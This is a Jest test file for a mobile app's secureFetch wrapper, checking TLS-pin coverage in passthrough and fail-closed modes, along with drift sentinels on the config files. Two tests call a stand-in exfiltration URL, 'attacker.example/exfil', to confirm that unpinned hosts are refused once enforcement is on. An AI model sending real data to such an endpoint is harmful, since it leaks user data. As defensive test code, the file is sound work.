/**
 * Regression tests for FIX-MOB-10 — TLS pinning chokepoint
 * (red-team finding HIGH-MOB-04, scaffolded 2026-05-05).
 *
 * **What is and isn't tested here**
 *
 * The actual TLS pinning enforcement happens at the platform layer
 * (iOS URLSession via NSPinnedDomains; Android via
 * network_security_config.xml). React Native's JS-side fetch can't
 * introspect TLS, so the only thing this module can enforce in JS is
 * "is this URL covered by our pin manifest?"
 *
 * The tests below pin the contract of `secureFetch` itself:
 *   - today (`PINNING_ENFORCED = false`): transparent passthrough so we
 *     can wire it into every call site without behaviour change;
 *   - once flipped on: hosts with no pin entry are REFUSED with
 *     `PinningError`, which is the intended fail-CLOSED behaviour.
 *
 * The drift sentinel asserts that `lib/pinning.ts` still exposes the
 * config knob and that `services/secureFetch.ts` actually consults it,
 * so a future refactor that accidentally short-circuits enforcement is
 * caught by the test rather than by a security incident.
 */

const mockFetch = jest.fn();

// We replace global fetch in beforeEach; this avoids needing to mock
// a node-level dependency.

let mockEnforced = false;
const mockPins: Record<string, ReadonlyArray<string>> = {};

jest.mock('@/lib/pinning', () => ({
  get PINNING_ENFORCED() {
    return mockEnforced;
  },
  pinsForUrl: (url: string) => {
    try {
      const host = new URL(url).hostname.toLowerCase();
      return mockPins[host] ?? [];
    } catch {
      return [];
    }
  },
  hostHasPins: (url: string) => {
    try {
      const host = new URL(url).hostname.toLowerCase();
      const pins = mockPins[host];
      return pins !== undefined && pins.length > 0;
    } catch {
      return false;
    }
  },
}));

import { secureFetch, PinningError } from '../services/secureFetch';

const _origFetch = global.fetch;
beforeEach(() => {
  mockFetch.mockReset().mockResolvedValue(new Response('ok', { status: 200 }));
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  (global as any).fetch = mockFetch;
  mockEnforced = false;
  for (const k of Object.keys(mockPins)) delete mockPins[k];
});

afterAll(() => {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  (global as any).fetch = _origFetch;
});

describe('secureFetch — passthrough mode (PINNING_ENFORCED = false)', () => {
  it('forwards every URL untouched to fetch', async () => {
    await secureFetch('https://agiworkforce.com/api/health');
    expect(mockFetch).toHaveBeenCalledWith('https://agiworkforce.com/api/health', undefined);
  });

  it('forwards init options (method, headers, body)', async () => {
    const init = {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ ping: true }),
    };
    await secureFetch('https://agiworkforce.com/api/x', init);
    expect(mockFetch).toHaveBeenCalledWith('https://agiworkforce.com/api/x', init);
  });

  it('does not throw on hosts without pins (since enforcement is off)', async () => {
    await expect(secureFetch('https://attacker.example/exfil')).resolves.toBeInstanceOf(Response);
  });
});

describe('secureFetch — enforced mode (PINNING_ENFORCED = true)', () => {
  it('refuses requests to hosts with no pins (fail-closed)', async () => {
    mockEnforced = true;
    // mockPins['agiworkforce.com'] is empty → no pins → must refuse.
    await expect(secureFetch('https://agiworkforce.com/api/health')).rejects.toBeInstanceOf(
      PinningError,
    );
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it('forwards to fetch when at least one pin is configured for the host', async () => {
    mockEnforced = true;
    mockPins['agiworkforce.com'] = ['sha256/abc='];
    await secureFetch('https://agiworkforce.com/api/health');
    expect(mockFetch).toHaveBeenCalledTimes(1);
  });

  it('matches host case-insensitively', async () => {
    mockEnforced = true;
    mockPins['agiworkforce.com'] = ['sha256/abc='];
    await secureFetch('https://AGIWORKFORCE.COM/health');
    expect(mockFetch).toHaveBeenCalledTimes(1);
  });

  it('refuses malformed URLs', async () => {
    mockEnforced = true;
    await expect(secureFetch('not a url')).rejects.toBeInstanceOf(PinningError);
  });

  it('error message points to the config file the developer must update', async () => {
    mockEnforced = true;
    try {
      await secureFetch('https://attacker.example/exfil');
      throw new Error('expected throw');
    } catch (err) {
      expect(err).toBeInstanceOf(PinningError);
      expect((err as Error).message).toMatch(/lib\/pinning\.ts/);
      expect((err as Error).message).toMatch(/PINS_BY_HOST/);
    }
  });
});

describe('drift sentinel — config knobs are still exposed', () => {
  it('lib/pinning.ts still exports PINNING_ENFORCED + PINS_BY_HOST', () => {
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    const fs = require('fs');
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    const path = require('path');
    const src = fs.readFileSync(path.join(__dirname, '..', 'lib', 'pinning.ts'), 'utf8');
    expect(src).toMatch(/export\s+const\s+PINS_BY_HOST/);
    expect(src).toMatch(/export\s+const\s+PINNING_ENFORCED/);
    // The empty pin arrays are intentional for now — the test fails noisily
    // if someone removes the config without doing the deploy-side cert work.
    expect(src).toContain('agiworkforce.com');
    expect(src).toContain('signaling.agiworkforce.com');
  });

  it('services/secureFetch.ts actually consults the config', () => {
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    const fs = require('fs');
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    const path = require('path');
    const src = fs.readFileSync(path.join(__dirname, '..', 'services', 'secureFetch.ts'), 'utf8');
    expect(src).toContain('PINNING_ENFORCED');
    expect(src).toContain('pinsForUrl');
    expect(src).toContain('PinningError');
  });
});
